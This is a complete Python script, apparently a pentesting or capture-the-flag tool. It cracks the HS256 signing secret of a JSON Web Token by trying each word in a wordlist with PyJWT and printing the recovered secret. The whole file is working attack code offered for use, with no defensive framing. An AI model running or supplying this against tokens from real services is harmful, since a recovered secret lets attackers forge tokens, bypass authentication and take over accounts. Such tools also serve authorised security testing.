from jwt import decode, InvalidTokenError, DecodeError
import sys

def is_jwt(jwt):
    parts = jwt.split('.')
    if len(parts) != 3:
        return False
    return True

def read_jwt(jwt):
    if not is_jwt(jwt):
        with open(jwt) as fp:
            jwt = fp.read().strip()
    if not is_jwt(jwt):
        raise RuntimeError('Parameter {} is not a valid JWT'.format(jwt))
    return jwt


def pwn(jwt, dictionary):
    with open(dictionary) as fp:
        for secret in fp:
            secret = secret.rstrip()
            try:
                decode(jwt, secret, algorithms=['HS256'])
                return secret
            except DecodeError:
                pass
            except InvalidTokenError:
                return secret

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: {} <JWT> <wordlist>'.format(sys.argv[0]))
    else:
        jwt = read_jwt(sys.argv[1])
        print('Cracking JWT {}'.format(jwt))
        result = pwn(jwt, sys.argv[2])
        if result:
            print('w00t: {}'.format(result))
        else:
            print("Oupsy :'(")
